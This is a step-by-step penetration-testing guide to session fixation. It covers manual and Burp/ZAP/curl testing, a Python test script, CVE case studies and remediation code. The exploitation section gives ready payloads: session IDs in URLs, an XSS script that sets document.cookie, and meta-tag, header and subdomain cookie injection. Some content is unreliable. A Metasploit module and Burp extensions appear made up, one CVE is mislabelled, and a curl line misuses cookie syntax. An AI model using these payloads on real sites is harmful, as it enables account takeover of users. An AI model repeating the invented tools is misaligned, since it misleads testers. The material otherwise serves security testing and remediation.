# Complete Methodology for Testing and Exploiting Session Fixation

Session fixation is a vulnerability that allows an attacker to force a user to use a session ID known to the attacker, enabling account takeover after the victim authenticates . This document provides a complete, step-by-step methodology for testing and exploiting this vulnerability using real-world techniques and tools.

---

## Table of Contents

1. Understanding Session Fixation
2. Prerequisites and Setup
3. Complete Testing Methodology
4. Exploitation Techniques
5. Real-World Examples and Case Studies
6. Tool-Specific Guides
7. Framework-Specific Testing
8. Automation and Scripting
9. Reporting and Remediation

---

## 1. Understanding Session Fixation

### 1.1 What Makes an Application Vulnerable

A web application is vulnerable to session fixation when it authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user . The core issue is that the application accepts a session identifier from an untrusted source and fails to regenerate it upon authentication .

### 1.2 The Three Phases of Attack

**Phase 1 - Session Set-up**: The attacker obtains a valid session ID from the target website without authenticating .

**Phase 2 - Session Fixation**: The attacker forces the victim's browser to use this known session ID using various techniques .

**Phase 3 - Session Entrance**: The victim authenticates to the application. If the session ID remains unchanged, the attacker can use the known ID to access the victim's authenticated session .

### 1.3 Key Difference from Session Hijacking

Session fixation is not a class of session hijacking. Session hijacking steals an established session after the user logs in, while session fixation fixes an established session on the victim's browser before the user logs in .

---

## 2. Prerequisites and Setup

### 2.1 Testing Environment Requirements

| Component | Requirement |
|-----------|-------------|
| Attacker Machine | Kali Linux, Windows with Burp Suite, or any system with proxy tools |
| Victim Simulation | Separate browser (Chrome incognito, Firefox private window) or different machine |
| Target Application | Web application requiring authentication |
| Network | Ability to intercept HTTP/HTTPS traffic |

### 2.2 Required Tools

**Primary Tools**:
- **Burp Suite Professional/Community** - For intercepting, modifying requests, and checking session cookie attributes 
- **OWASP ZAP** - Similar to Burp Suite, with automated session-related vulnerability checks 
- **Browser Developer Tools** - For cookie inspection and manipulation

**Secondary Tools**:
- **Wireshark** - For sniffing network traffic and capturing session tokens over HTTP 
- **BeEF** - For exploiting XSS to manipulate session tokens through JavaScript 
- **Metasploit** - For session hijacking and post-exploitation tasks 

### 2.3 Practice Environments

- **OWASP Juice Shop** - Vulnerable web application for practice 
- **DVWA (Damn Vulnerable Web Application)** - Another practice environment 
- **vm_1 vulnerable virtual machine** - Contains applications for testing session fixation 

---

## 3. Complete Testing Methodology

### 3.1 Information Gathering Phase

Before testing for session fixation, gather information about how the application manages sessions :

```bash
# Step 1: Review session cookies
# Using curl to see initial cookie settings
curl -v -c - https://target.com/login 2>&1 | grep -i "set-cookie"

# Step 2: Examine response headers
curl -I https://target.com/login
```

**What to look for**:
- Session cookie names (JSESSIONID, PHPSESSID, sessionid, etc.)
- Cookie attributes (HttpOnly, Secure, SameSite)
- Whether session ID appears in URLs
- Session lifecycle behavior

### 3.2 Manual Testing Procedure

**Step 1: Obtain a pre-authentication session ID**

Using Burp Suite or browser developer tools:
1. Navigate to the target application's login page
2. Intercept the request/response
3. Record the session cookie value set by the server

Example response showing session cookie :
```
HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure
```

**Step 2: Attempt to fix the session on a victim browser**

Open a separate browser instance (incognito/private mode) to simulate a victim:

Using browser developer tools:
1. Open Developer Tools (F12)
2. Navigate to Application/Storage tab
3. Add/Edit the session cookie to match the attacker's value
4. Refresh the page

Using cURL:
```bash
# Set custom cookie value
curl -b "JSESSIONID=attacker_value" https://target.com/login
```

**Step 3: Authenticate as victim**

In the victim browser instance:
1. Log in with valid credentials
2. Observe if the session cookie changes after authentication

**Step 4: Verify vulnerability**

In the attacker's original browser:
1. Refresh the page
2. Check if you are now logged in as the victim
3. Attempt to access authenticated pages

### 3.3 Automated Testing with Burp Suite

**Using Burp Sequencer**:
1. Capture a login request
2. Send to Sequencer
3. Analyze session cookie randomness

**Using Burp Repeater for Fixation Test**:
1. Capture a pre-authentication request with session cookie
2. Send to Repeater
3. Modify parameters to attempt login
4. Check response for session regeneration

### 3.4 Testing with OWASP ZAP

ZAP provides automated session management testing :
1. Run ZAP's automated scan
2. Review "Session Management" alerts
3. Use ZAP's "Replay" functionality for manual testing

### 3.5 OWASP Testing Guide Methodology

The OWASP Web Security Testing Guide provides this structured approach for testing session fixation :

**Test with Forced Cookies**:

1. Reach the login page of the website
2. Save a snapshot of the cookie jar before logging in
3. Login as the victim and reach a page requiring authentication
4. Set the cookie jar back to the pre-login snapshot
5. Trigger a secure function that requires authentication
6. Observe if the operation succeeds - if yes, the attack was successful

**Two-Account Testing Method**:
Using two different machines or browsers for victim and attacker reduces false positives, especially if the application does fingerprinting .

---

## 4. Exploitation Techniques

### 4.1 Session Token in URL Arguments

This technique involves sending the session ID as a URL parameter .

**Attack Vector**:
```
https://target.com/login?PHPSESSID=attacker_session
https://target.com/login?JSESSIONID=attacker_session
https://target.com/login;jsessionid=attacker_session
```

**How to Exploit**:
1. Attacker visits the login page and obtains or crafts a session ID
2. Attacker creates a malicious link with the session ID in the URL
3. Victim clicks the link
4. Victim logs in using the fixed session
5. Attacker uses the same URL or cookie to access victim's account

**Real-World Example**: Schneider Electric EcoStruxure Power Monitoring Expert allowed attackers to set a session ID in advance via the login URL. An attacker could send a crafted link containing a predefined session ID to a victim, and when the victim logged in using that link, the attacker could use the same session ID to access the authenticated session.

### 4.2 Session ID in Cookie via Client-Side Scripting (XSS)

This technique uses cross-site scripting to set a cookie value .

**Attack Vector**:
```html
http://website.com/<script>document.cookie="sessionid=abcd";</script>
```

**How to Exploit**:
1. Find an XSS vulnerability on the target site
2. Craft a payload that sets the session cookie to the attacker's value
3. Deliver the malicious link to the victim
4. When the victim clicks and logs in, the attacker can hijack the session

**Real-World Example**: CVE-2024-7053 in open-webui version 0.3.8 allowed session fixation through markdown image injection. An attacker with a user-level account could embed a malicious markdown image in a chat. When viewed by an administrator, it sent the admin's session cookie to the attacker's server, leading to administrator account takeover and potential remote code execution .

### 4.3 META Tag Injection

This technique uses HTML meta tags to set cookies and is more reliable than JavaScript because meta tags cannot be disabled by browser settings .

**Attack Vector**:
```html
<meta http-equiv="Set-Cookie" content="sessionid=abcd">
```

**How to Exploit**:
1. Find an HTML injection vulnerability
2. Inject the meta tag into the page
3. The victim's browser processes the meta tag and sets the cookie
4. After victim authentication, attacker uses the known session ID

### 4.4 HTTP Response Header Injection

This method manipulates the server response to insert a Set-Cookie header .

**Attack Vector**:
```
Set-Cookie: sessionid=attacker_session
```

**How to Exploit**:
1. Find an HTTP response splitting or header injection vulnerability
2. Intercept server responses and add the Set-Cookie header
3. The victim's browser receives and processes the malicious cookie

### 4.5 Subdomain Cookie Injection

If the attacker controls a subdomain, they can set cookies for the parent domain.

**Attack Vector**:
```javascript
// On attacker-controlled subdomain
document.cookie = "sessionid=attacker_session; domain=.target.com; path=/"
```

### 4.6 Cross-Site Cooking (Image Tag)

**Attack Vector**:
```html
<img src="https://target.com/page?sessionid=attacker_session">
```

---

## 5. Real-World Examples and Case Studies

### 5.1 GLPI Session Fixation (CVE-2026-23624)

**Vulnerability**: Session fixation in GLPI IT asset management software when remote authentication via SSO was enabled.

**Affected Versions**: 0.71 through 10.0.22 and 11.0.0 through 11.0.4

**Exploitation Scenario**:
- A legitimate user authenticated to GLPI via SSO on a shared workstation
- The user's session artifacts persisted after they finished working
- An attacker with physical access to the same machine authenticated and accessed the previous user's session data
- The attacker gained the permissions of the victim user

**Fix**: Patched in versions 10.0.23 and 11.0.5

### 5.2 IBM Sterling Connect:Direct Web Services (CVE-2024-45651)

**Vulnerability**: Does not invalidate session after browser closure, allowing an authenticated user to impersonate another user .

**Affected Versions**: 6.1.0, 6.2.0, and 6.3.0

**Impact**: An authenticated user could impersonate another user on the system .

### 5.3 Honeywell XL Web II Controller (CVE-2017-5141)

**Vulnerability**: Session fixation in firmware prior to XL1000C500 XLWebExe-2-01-00.

**Impact**: An attacker could establish a new user session without invalidating existing session identifiers, enabling authenticated session theft.

**CVSS Score**: 6.0 (MEDIUM)

### 5.4 IBM Initiate Master Data Service (CVE-2014-4789)

**Vulnerability**: Session fixation in versions 9.5, 9.7, 10.0, and 10.1.

**Impact**: Remote attackers could hijack web sessions and bypass authentication.

### 5.5 OliveTin Session Invalidation Failure (CVE-2026-30224)

**Vulnerability**: In OliveTin versions prior to 3000.11.1, although the browser cookie was cleared upon logout, the corresponding session remained valid in server storage until expiry (default approximately one year).

**Impact**: An attacker with a previously captured session cookie could continue authenticating after the victim logged out.

### 5.6 ScriptCase Vulnerability Chain (CVE-2025-47227)

**Vulnerability**: Enabled unauthenticated password reset via session fixation combined with CAPTCHA bypass.

**Impact**: Required only basic HTTP requests (using cURL) and was accessible to low-skilled attackers.

### 5.7 Open WebUI Session Fixation (CVE-2024-7053)

**Vulnerability**: Session cookie set with `SameSite=Lax` and without `Secure` flag, allowing session cookie to be sent over HTTP to a cross-origin domain .

**Exploitation**: Attacker embeds malicious markdown image in a chat. When viewed by an administrator, the admin's session cookie is sent to the attacker's server .

**Impact**: Stealthy administrator account takeover, potentially resulting in remote code execution due to elevated privileges .

---

## 6. Tool-Specific Guides

### 6.1 Burp Suite Complete Workflow

**Setup**:
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Install Burp's CA certificate for HTTPS interception

**Testing Steps**:

1. **Map the application**:
   - Browse the application manually
   - Use Spider or Crawler to discover all endpoints

2. **Identify session parameters**:
   - Use "Search" feature to find cookie names
   - Check for session IDs in URL parameters

3. **Test for fixation manually**:
   ```
   a. Send a request to the login page to Repeater
   b. Change the session cookie value to "test123"
   c. Send the request and observe if the server accepts it
   d. Send a login request with the same modified cookie
   e. Check if the session ID changes after login
   ```

4. **Use Intruder for brute force testing**:
   - Set payload position for session cookie value
   - Test with different values to see if any are accepted

5. **Use Sequencer for randomness analysis**:
   - Capture multiple session tokens
   - Analyze entropy and predictability

**Burp Suite Extensions**:
- **SessionFixationDetector** - Custom extension for detecting fixation
- **CookieDecryptor** - For decrypting encoded session tokens

### 6.2 OWASP ZAP Complete Workflow

**Automated Testing**:
1. Launch ZAP and configure browser proxy
2. Use "Automated Scan" with the target URL
3. Review "Session Management" alerts in the report

**Manual Testing with ZAP**:
1. Use "Manual Explore" to browse the application
2. Open "History" tab and locate login requests
3. Right-click and select "Open in Replay"
4. Modify session cookies and resend
5. Use "Compare" function to see response differences

**ZAP Scripting**:
```javascript
// ZAP JavaScript script to test session fixation
function testSessionFixation(loginUrl, sessionValue) {
    // Set session cookie
    // Attempt login
    // Verify session regeneration
}
```

### 6.3 cURL Command Reference

**Obtain pre-auth session**:
```bash
# Get initial session
curl -c preauth.txt https://target.com/login

# View cookie
cat preauth.txt
```

**Test URL parameter fixation**:
```bash
# Test if session accepted in URL
curl -v "https://target.com/login?PHPSESSID=attacker123"
```

**Complete fixation test**:
```bash
# Step 1: Attacker gets session
curl -c attacker_cookies.txt https://target.com/login

# Step 2: Extract session ID
SESSION_ID=$(grep -oP 'sessionid=\K[^;]+' attacker_cookies.txt)

# Step 3: Victim logs in with fixed session
curl -b "sessionid=$SESSION_ID" -c victim_cookies.txt -X POST \
  -d "username=victim&password=pass" https://target.com/login

# Step 4: Check if session changed
diff attacker_cookies.txt victim_cookies.txt
```

**Test with different session ID formats**:
```bash
# Test uppercase, lowercase, numeric only
for sess in "test123" "TEST123" "123456"; do
    curl -b "sessionid=$sess" https://target.com/login
done
```

### 6.4 Metasploit for Session Fixation

Metasploit can be used for post-exploitation after successful fixation :

```ruby
# msfconsole
use auxiliary/admin/http/session_fixation
set RHOSTS target.com
set SESSION_ID attacker_session
set METHOD cookie
run
```

### 6.5 BeEF for XSS-Based Fixation

BeEF (Browser Exploitation Framework) can inject session cookies through hooked browsers :

1. Hook the victim's browser using BeEF
2. Use the "Create Cookie" command module
3. Set the session cookie to the attacker's value
4. Wait for victim authentication

---

## 7. Framework-Specific Testing

### 7.1 Java/J2EE Applications (JSESSIONID)

**Vulnerable Pattern**: Using `j_security_check` without invalidating the existing session .

**Vulnerable Code Example**:
```java
private void auth(LoginContext lc, HttpSession session) throws LoginException {
    lc.login();  // No session invalidation before authentication
}
```

**Test Method**:
1. Obtain JSESSIONID from any page
2. Send victim to `https://target.com/login;jsessionid=attacker_value`
3. After login, check if JSESSIONID changed

**Secure Code**:
```java
private void auth(LoginContext lc, HttpSession session) throws LoginException {
    session.invalidate();  // Invalidate old session
    HttpSession newSession = request.getSession(true);
    lc.login();
}
```

### 7.2 PHP Applications (PHPSESSID)

**Testing URL Parameters**:
```
https://target.com/login.php?PHPSESSID=attacker_value
```

**Testing Cookie Settings**:
```bash
# Check session configuration via phpinfo
curl https://target.com/phpinfo.php | grep -i "session"
```

### 7.3 ASP.NET Applications (ASP.NET_SessionId)

**Characteristics**:
- Session ID typically 24 characters
- URL parameter: `(S(sessionid))` in URLs

**Test Vectors**:
```
https://target.com/login.aspx?(S(attacker_value))
```

### 7.4 Ruby on Rails

**Session Cookie Name**: `_application-name_session`

**Test Approach**:
```bash
# Test if session ID in URL is accepted
curl -b "_app_session=attacker" https://target.com/login

# Check session store configuration
curl https://target.com/config/initializers/session_store.rb
```

---

## 8. Automation and Scripting

### 8.1 Python Automation Script

```python
#!/usr/bin/env python3
import requests
import sys

def test_session_fixation(target_url, login_data):
    """
    Automated session fixation test
    """
    session = requests.Session()
    
    # Step 1: Get initial session
    print("[*] Getting initial session...")
    resp = session.get(f"{target_url}/login")
    initial_cookie = session.cookies.get_dict()
    print(f"[+] Initial session cookie: {initial_cookie}")
    
    # Step 2: Try to set custom session
    print("[*] Attempting to set custom session ID...")
    custom_session = {"sessionid": "attacker_fixed_session"}
    session.cookies.update(custom_session)
    
    # Step 3: Attempt login
    print("[*] Attempting login with fixed session...")
    resp = session.post(f"{target_url}/login", data=login_data)
    
    # Step 4: Check session after login
    post_login_cookie = session.cookies.get_dict()
    print(f"[+] Post-login cookie: {post_login_cookie}")
    
    # Step 5: Verify if vulnerable
    if post_login_cookie.get("sessionid") == "attacker_fixed_session":
        print("[!] VULNERABLE: Session ID did not change after login")
        return True
    else:
        print("[+] NOT VULNERABLE: Session ID was regenerated")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python session_fixation_test.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    credentials = {"username": "test", "password": "test"}
    test_session_fixation(target, credentials)
```

### 8.2 Burp Suite Intruder Payload Configuration

**For testing session regeneration**:
1. Position payload marker in session cookie value
2. Use payload type: "Simple list"
3. Add test values: "test123", "attacker", "fixed", "12345"
4. Set grep option to match "Set-Cookie"
5. Analyze responses for session regeneration

### 8.3 OWASP ZAP Automation with Python

```python
from zapv2 import ZAPv2

zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})

# Access the target
zap.urlopen('https://target.com/login')

# Spider the target
zap.spider.scan('https://target.com/login')

# Run active scan including session checks
zap.ascan.scan('https://target.com/login', scan_policy_name='Session Management')
```

---

## 9. Indicators of Vulnerability

Use this checklist during testing:

| Indicator | Test Method | Vulnerable If |
|-----------|-------------|---------------|
| Session ID unchanged after login | Compare pre/post-auth cookies | Same value |
| Session accepted via URL | Browse with session in URL | Session is maintained |
| No HttpOnly flag | Check Set-Cookie header | Flag missing |
| Broad cookie domain | Check domain attribute | Domain is `.target.com` |
| Long session timeout | Monitor session expiry | > 24 hours |
| Predictable session ID | Analyze pattern | Sequential/weak entropy |

**Quick Test Command**:
```bash
# Complete test in one line
curl -c - -b "sessionid=test" -X POST -d "user=test&pass=test" https://target.com/login | grep -i "set-cookie"
```

---

## 10. Reporting and Remediation

### 10.1 What to Include in Reports

When reporting a session fixation vulnerability, include:

1. **Vulnerability Description**: CWE-384 (Session Fixation) 
2. **Attack Vector**: How the session was fixed
3. **Steps to Reproduce**: Detailed reproduction steps
4. **Proof of Concept**: Screenshots or curl commands
5. **Impact Assessment**: Account takeover potential
6. **CVSS Score**: Based on attack complexity and impact

### 10.2 Remediation Recommendations

**Primary Fix**: Regenerate session ID after successful authentication 

**Implementation Examples**:

Java/J2EE:
```java
session.invalidate();
HttpSession newSession = request.getSession(true);
```

PHP:
```php
session_regenerate_id(true);
```

ASP.NET:
```csharp
Session.Abandon();
Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId", ""));
```

**Additional Mitigations** :
- Use `HttpOnly` and `Secure` flags on session cookies
- Implement `SameSite=Strict` or `Lax`
- Reject session IDs from URL parameters
- Implement short session timeouts
- Add `__Host-` or `__Secure-` prefix to cookie names 

### 10.3 Verification After Fix

After remediation, verify the fix:
```bash
# Test that session changes on login
curl -c pre.txt https://target.com/login
curl -b pre.txt -c post.txt -X POST -d "user=test&pass=test" https://target.com/login
diff pre.txt post.txt
# Should show different session values
```

---

## 11. Quick Reference Card

### One-Liner Test Commands

```bash
# Basic fixation test
curl -c - -b "sessionid=attacker" -X POST -d "user=victim&pass=password" https://target.com/login

# Check cookie security
curl -sI https://target.com/login | grep -i "set-cookie"

# Test URL parameter fixation
curl -b "sessionid=test" "https://target.com/login?sessionid=test"

# Test subdomain cookie
curl -b "sessionid=attacker; domain=.target.com" https://target.com/login
```

### Common Session Cookie Names by Framework

| Framework | Default Cookie Name |
|-----------|---------------------|
| Java/J2EE | JSESSIONID |
| PHP | PHPSESSID |
| ASP.NET | ASP.NET_SessionId |
| Ruby on Rails | _appname_session |
| Django | sessionid |
| Express/Node | connect.sid |

---

## References

- OWASP Testing Guide: Testing for Session Fixation (WSTG-SESS-03) 
- CWE-384: Session Fixation 
- OWASP Session Fixation Attack Description 
- Kali Linux Web Penetration Testing Cookbook 
